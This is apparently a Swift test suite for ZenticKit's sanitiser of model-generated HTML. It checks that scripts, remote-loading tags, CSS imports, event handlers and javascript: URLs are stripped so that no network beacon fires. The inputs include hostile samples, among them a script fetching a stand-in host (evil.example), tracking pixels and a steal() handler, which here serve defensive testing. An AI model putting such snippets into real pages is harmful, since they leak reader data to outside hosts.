import Foundation
import Testing

@testable import ZenticKit

/// Generated markup is the one place a model authors code that a page runs.
///
/// Every test here is a way the network could be reached from a design the user
/// asked for — which would be a beacon firing on every page read, silently, and
/// exactly the failure invariant 5 was written to prevent.
@Suite("Generated HTML sanitising")
struct GeneratedHTMLTests {

    @Test func scriptsAreRemovedWithTheirContents() {
        let html = GeneratedHTML.sanitize(
            "<p>before</p><script>fetch('https://evil.example/x')</script><p>after</p>",
            allowing: []
        )
        #expect(!html.contains("script"))
        #expect(!html.contains("evil.example"))
        #expect(html.contains("before"))
        #expect(html.contains("after"))
    }

    @Test func styleSurvivesButCannotFetch() {
        let html = GeneratedHTML.sanitize(
            """
            <style>
            @import url("https://fonts.example/x.css");
            @font-face { font-family: X; src: url(https://fonts.example/x.woff2); }
            body { color: #222; background-image: url('https://tracker.example/pixel.gif'); }
            </style>
            <p>text</p>
            """,
            allowing: []
        )
        // The design survives…
        #expect(html.contains("<style>"))
        #expect(html.contains("color: #222"))
        // …but every route out does not.
        #expect(!html.contains("fonts.example"))
        #expect(!html.contains("tracker.example"))
        #expect(!html.lowercased().contains("@import"))
        #expect(!html.lowercased().contains("@font-face"))
    }

    @Test func remoteLoadingElementsAreRemoved() {
        for tag in ["<iframe src=\"https://x.example\"></iframe>", "<link rel=\"stylesheet\" href=\"https://x.example/a.css\">", "<object data=\"https://x.example\"></object>", "<embed src=\"https://x.example\">"] {
            let html = GeneratedHTML.sanitize("<p>keep</p>\(tag)", allowing: [])
            #expect(!html.contains("x.example"), "\(tag) survived")
            #expect(html.contains("keep"))
        }
    }

    @Test func eventHandlersAreRemoved() {
        let html = GeneratedHTML.sanitize(
            "<div onclick=\"steal()\" onmouseover='x()'>hi</div>",
            allowing: []
        )
        #expect(!html.lowercased().contains("onclick"))
        #expect(!html.lowercased().contains("onmouseover"))
        #expect(html.contains("hi"))
    }

    /// The rule that keeps a generated page from introducing a new host: an image
    /// is allowed only if the page already loads that exact URL.
    @Test func onlyImagesThePageAlreadyLoadsSurvive() {
        let allowed = "https://site.example/photo.jpg"
        let html = GeneratedHTML.sanitize(
            """
            <img src="\(allowed)" alt="real">
            <img src="https://tracker.example/1x1.gif" alt="pixel">
            """,
            allowing: [allowed]
        )
        #expect(html.contains(allowed))
        #expect(!html.contains("tracker.example"))
    }

    @Test func javascriptURLsAreRemoved() {
        let html = GeneratedHTML.sanitize("<a href=\"javascript:alert(1)\">x</a>", allowing: [])
        #expect(!html.lowercased().contains("javascript:"))
    }

    @Test func aFencedAnswerIsUnwrapped() {
        let html = GeneratedHTML.sanitize("```html\n<p>hello</p>\n```", allowing: [])
        #expect(html == "<p>hello</p>")
    }

    /// The placeholder is how invariant 3 survives a full-page layout: the model
    /// positions code and tables without ever being given them.
    @Test func placeholdersAreLeftForTheBundleToFill() {
        let html = GeneratedHTML.sanitize(
            "<main><zentic-section section=\"s3\"></zentic-section></main>",
            allowing: []
        )
        #expect(html.contains("<zentic-section section=\"s3\">"))
    }

    @Test func nonRewritableSectionsAreNeverInTheRequest() {
        let request = DocumentRequest(
            extraction: ExtractionResult(
                url: "https://example.com/a",
                archetype: .article,
                title: "T",
                wordCount: 2,
                sections: [
                    ContentSection(id: "s1", kind: .paragraph, markdown: "prose"),
                    ContentSection(id: "s2", kind: .code, markdown: "let secret = 1"),
                ],
                confidence: 1
            ),
            prompt: "newsprint"
        )
        let ids = request.rewritableSections.map(\.id)
        #expect(ids == ["s1"])
    }
}
